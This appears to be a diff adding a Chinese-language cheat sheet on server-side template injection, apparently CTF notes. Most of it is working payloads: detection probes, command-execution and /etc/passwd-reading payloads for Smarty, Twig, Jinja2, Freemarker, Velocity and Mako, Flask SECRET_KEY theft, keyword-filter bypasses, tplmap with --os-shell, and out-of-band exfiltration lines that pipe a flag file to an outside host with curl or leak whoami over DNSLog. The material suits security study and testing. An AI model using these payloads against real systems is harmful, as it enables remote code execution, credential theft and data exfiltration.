@@ -1,0 +1,169 @@
+# SSTI（模板注入） 知识点
+
+> Server-Side Template Injection — 服务端模板注入
+
+---
+
+## 检测 SSTI
+
+### 通用测试 Payload
+```
+{{7*7}}
+${7*7}
+{{7*'7'}}    → 49（Jinja2） vs 7777777（Twig）
+<%= 7*7 %>
+```
+
+### 不同模板引擎的区分
+
+| Payload | Jinja2 (Python) | Twig (PHP) | Freemarker (Java) | Velocity (Java) |
+|---------|----------------|------------|-------------------|-----------------|
+| `{{7*'7'}}` | `49` | `7777777` | 报错 | 报错 |
+| `${7*7}` | 原样输出 | `49` | `49` | `49` |
+| `#{7*7}` | 原样输出 | 原样输出 | `49` | 原样输出 |
+
+---
+
+## 各引擎利用
+
+### 1. Smarty (PHP)
+
+```php
+{$smarty.version}
+{php}echo system('id');{/php}
+{system('id')}
+{"id"|system}
+```
+
+### 2. Twig (PHP)
+
+```twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+{{_self.env.setCache("/tmp");system('id')}}
+{{_self.env.getFilter('cat /etc/passwd')}}
+```
+
+### 3. Jinja2 (Python/Flask)
+
+```python
+# 获取当前类
+{{ ''.__class__ }}
+
+# 获取 mro
+{{ ''.__class__.__mro__ }}
+
+# 获取 object 类
+{{ ''.__class__.__mro__[2] }}
+
+# 获取所有子类
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+
+# 查找可利用类（如 subprocess.Popen, os, builtins）
+{{ ''.__class__.__mro__[2].__subclasses__()[<index>] }}
+
+# 命令执行
+{{ ''.__class__.__mro__[2].__subclasses__()[<index>]('id',shell=True,stdout=-1).communicate() }}
+
+# 文件读取
+{{ ''.__class__.__mro__[2].__subclasses__()[<index>]('/etc/passwd').read() }}
+
+# 常用 payload 简化版
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{joiner.__init__.__globals__.os.popen('id').read() }}
+{{namespace.__init__.__globals__.os.popen('id').read() }}
+{{ config.items() }}
+```
+
+#### Flask 特有利用
+```python
+# 获取 SECRET_KEY
+{{ config.SECRET_KEY }}
+
+# 利用 SECRET_KEY 伪造 session
+# 使用 flask-unsign 工具
+```
+
+### 4. Freemarker (Java)
+
+```ftl
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ ex("id") }
+
+<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
+${ value("java.lang.ProcessBuilder","id").start() }
+```
+
+### 5. Velocity (Java)
+
+```velocity
+#set($e="exp")
+#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
+#set($input=$x.getInputStream())
+#set($sc=$e.getClass().forName("java.util.Scanner").getConstructor($e.getClass().forName("java.io.InputStream")).newInstance($input))
+#set($out=$sc.useDelimiter("\\a").next())
+$out
+```
+
+### 6. Mako (Python)
+
+```python
+${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}
+```
+
+---
+
+## CTF 中的 SSTI 绕过技巧
+
+### 关键字过滤绕过
+
+| 过滤 | 绕过方式 |
+|------|----------|
+| `__class__` | `'\x5f\x5fclass\x5f\x5f'` 或 `request['__class__']` |
+| `__` 被过滤 | `{{''|attr('\x5f\x5fclass\x5f\x5f')}}` 或 `['__class__']` |
+| `{{` 被过滤 | `{% if ... %}` 使用标签语法 |
+| `.` 被过滤 | `['__class__']` 或 `|attr('__class__')` |
+| `[]` 被过滤 | `.__getitem__('__class__')` |
+| `'` 被过滤 | `~` 拼接：`~request.args.a~`+参数传值 |
+
+### Jinja2 绕过 filter 示例
+```python
+# 使用 request 对象传参
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+
+# 过滤了 . 时
+{{ ''['__class__']['__mro__'][2]['__subclasses__']() }}
+
+# 过滤了 class 字符串时
+{{ ''|attr('__cla'+'ss__')|attr('__mr'+'o__')|attr('__getitem__')(2) }}
+
+# 使用十六进制
+{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
+
+# 使用 hex 过滤器
+{{ ''|attr('__class__') }}
+
+# 读取文件（无回显时带外）
+{{ ''.__class__.__mro__[2].__subclasses__()[X]('cat /flag | curl http://vps/ -d @-') }}
+
+# 无回显时 DNSLog
+{{ config.__class__.__init__.__globals__['os'].popen('ping `whoami`.dnslog.cn').read() }}
+```
+
+---
+
+## 检测命令速查
+
+```python
+# 自动化检测 SSTI 的工具
+# tplmap — 类似 sqlmap 的 SSTI 利用工具
+python2 tplmap.py -u 'http://target.com/page?name=*'
+python2 tplmap.py -u 'http://target.com/page?name=*' --os-shell
+
+# 简单测试 GET
+curl -G 'http://target.com/page' --data-urlencode 'name={{7*7}}'
+curl -G 'http://target.com/page' --data-urlencode 'name=${7*7}'
+```
